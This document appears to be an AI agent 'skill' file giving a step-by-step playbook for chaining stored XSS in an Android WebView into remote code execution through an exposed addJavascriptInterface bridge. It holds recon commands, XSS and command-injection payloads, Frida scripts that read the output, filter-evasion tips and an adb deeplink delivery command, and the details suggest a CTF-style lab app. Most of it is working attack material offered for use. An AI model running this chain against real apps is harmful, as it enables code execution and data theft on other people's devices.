---
name: webview-xss-rce-bridge
description: Use when an Android WebView renders unsanitized user input (innerHTML) and exposes an addJavascriptInterface bridge whose method concatenates input to Runtime.exec or ProcessBuilder, chaining stored XSS into RCE as the app UID. Triggers - "XSS to RCE", "innerHTML bridge", "addJavascriptInterface exec", "stored XSS WebView RCE", "ProcessBuilder bridge", "WebView chain RCE"
platform: [android]
stack: [native]
category: webview
tier: B
related: []
---

# Skill: WebView XSS → RCE via addJavascriptInterface (Android)

## When to use
An Android app with a WebView that:
- Loads local (`file:///android_asset/...`) or remote content
- Renders user input without sanitizing (innerHTML, insertAdjacentHTML, etc.)
- Exposes a bridge with `addJavascriptInterface(obj, "Name")`
- The bridge has a method that executes commands or concatenates strings into `Runtime.exec` / `ProcessBuilder`

## Attack chain
```
Deeplink/UI → Stored XSS (unsanitized innerHTML)
    → JS calls the exposed bridge
        → bridge method concatenates input into /bin/sh -c
            → RCE as the app's uid
```

## Step 1: Static recon (jadx + apktool)
```bash
jadx -d jadx_out app.apk
apktool d app.apk -o apktool_out
```
Search the decompiled code for:
- `addJavascriptInterface(` → bridge name
- `loadUrl("file:///android_asset/` → WebView origin
- `setJavaScriptEnabled(true)` → JS enabled
- `Runtime.getRuntime().exec(` / `ProcessBuilder` → RCE sink
- `innerHTML` / `insertAdjacentHTML` in assets/*.html → XSS sink
- Manifest: exported activities with `android:scheme` → injection vector

## Step 2: Confirm the XSS
Test payload (via UI or deeplink):
```html
<img src=x onerror="alert('xss')">
```
Enumerate the bridge's methods:
```html
<img src=x onerror="alert(Object.keys(WebAppInterface))">
```

## Step 3: RCE
```html
<img src=x onerror="WebAppInterface.postCowsayMessage('hello;id')">
```
The `;` allows chaining commands if the bridge concatenates into `/bin/sh -c`.

## Step 4: Read the output
The command output usually stays in the app's message cache. Read it with Frida:
```js
Java.perform(function () {
    var cache = Java.use("WebAppCache");
    var c = cache.$new();
    var msgs = c.getMessages();
    for (var i = 0; i < msgs.size(); i++) {
        console.log("[+] msg[" + i + "]:\n" + msgs.get(i));
    }
});
```
Or hook the bridge method to capture the return:
```js
Java.perform(function () {
    var CowsayUtil = Java.use("CowsayUtil$Companion");
    CowsayUtil.runCowsay.implementation = function (message) {
        var ret = this.runCowsay(message);
        console.log("[+] RET:\n" + ret);
        return ret;
    };
});
```

## Common pitfalls
1. **`+` in base64 becomes a space in URIs**: use URL-encoding (`%2B`) or a script on the device.
2. **`==` at the end of base64 gets lost**: URL-encode it (`%3D%3D`) or use `-n` with the full component.
3. **Activity without `onNewIntent`**: the deeplink is only processed if the activity is created fresh; run `am force-stop` first.
4. **Markdown parser before the XSS**: `*flag*` can become `<i>flag</i>`; use HTML entities (`&#42;`) to evade.
5. **Only stdout is read**: add `2>&1` to the command to capture stderr.
6. **Class names at runtime**: `defpackage.CowsayUtil$Companion` in jadx can be `CowsayUtil$Companion` at runtime; enumerate with `Java.enumerateLoadedClasses`.
7. **Frida spawn vs attach**: if spawn fails, attach to the live process's PID.

## Useful commands
```bash
# Deeplink with a base64 payload
adb shell am start -a android.intent.action.VIEW -d "postboard://postmessage/<b64>" -n pkg/.MainActivity

# Frida attach
frida -D <device> -p <pid> -l script.js -o log.txt

# Enumerate classes
Java.enumerateLoadedClasses({onMatch: function(n){ if(n.indexOf("postboard")!==-1) console.log(n); }})
```
